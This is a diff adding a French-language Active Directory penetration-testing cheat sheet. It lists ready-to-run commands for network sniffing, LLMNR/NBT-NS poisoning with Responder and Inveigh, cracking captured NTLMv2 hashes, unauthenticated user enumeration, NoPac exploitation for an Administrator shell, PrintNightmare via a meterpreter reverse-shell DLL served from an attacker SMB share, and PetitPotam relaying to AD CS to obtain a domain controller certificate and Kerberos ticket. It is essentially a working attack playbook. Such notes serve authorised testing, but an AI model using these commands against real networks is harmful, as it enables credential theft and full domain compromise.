@@ -1,0 +1,56 @@
+Network:
+wireshark
+sudo tcpdump -i <INT>
+
+#LINUX
+sudo responder -I <INT> -A
+-->Si LLMNR/NBT-NS poison ok avec Hash
+=> hashcat -m 5600 <HASH> <PASS_WORDLIST>
+
+#WINDOWS
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+OU
+Inveigh.exe (InveighZero Inveigh_C#)
+
+#Linux: for i in {1..254}; do ping -c 1 172.16.6.$i | grep "bytes from"; done
+#Windows: 1..254 \ % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
+
+Enumération Utilisateurs:
+#Sans Creds
+Kerbrute: kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_WDLIST> -o <OUTPUT>
+Enum4Linux: enum4linux -U <IP> | grep "user: " | cut -f2 -d"[" | cut -f1 -d"]"
+RpcClient: rpcclient -U ''' -N <IP> | enumdomusers
+CME: crackmapexec smb <IP> --users
+LDAPSearch: ldapsearch -h <IP> -x -b "DC=foo,DC=foo" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+Windapsearch.py: windapsearch.py --dc-ip <IP> -u "" -U
+#Avec Creds
+sudo crackmapexec smb <IP> -u <USER> -p <PASS> --users
+
+
+Identifier les vulnérabilitées:
+SeImpersonate --> JuicyPotato
+
+NoPac.py (BRUYANT et souvent bloqué par AV) --> scanner.py <domain>/<user>:<pass> -dc-ip <ip_dc> -use-ldap
+Si ms-DS-MachineAccountQuota = 10 --> vuln
+-->NoPac.py <domain>/<user>:<pass> -dc-ip <ip_dc>  -dc-host <hostname> -shell --impersonate <Administrator> -use-ldap
+Dump ticket = + '-dump' flag
+
+PrintNightmare:
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+Vulnérable ? rpcdump.py @<ip_dc> | egrep 'MS-RPRN|MS-PAR'
+Si PSARP et PSRP activé --> go
+msf: meterpreter/reverse_tcp -f dll
+upload avec smbserver.py
+start handler
+python3 CVE-2021-1675.py <dom>/<user>:<pass>@<dc_ip> '\\<ip_smb>\chemin\malicious.dll'
+
+PetitPotam:
+sudo impacket-ntlmrelayx.py -debug -smb2support --target http://<FQDN>/certsrv/certfnsh.asp --adcs --template DomainController
+python3 PetitPotam.py <Attack_Host> <dc_ip>
+-->Existe en version ps1: Invoke-PetitPotam.ps1
+Si succes --> b64 encoded cert sur ntlmrelayx
+Requete TGT avec gettgtpkinit.py
+gettgtpkinit.py <Domain>/<Machine>\ -pfx-base64 <b64_encoded_cert>= dc01.ccache
+Set krb5 env var: export KRB5CCNAME=dc01.ccache
+Controler avec: klist
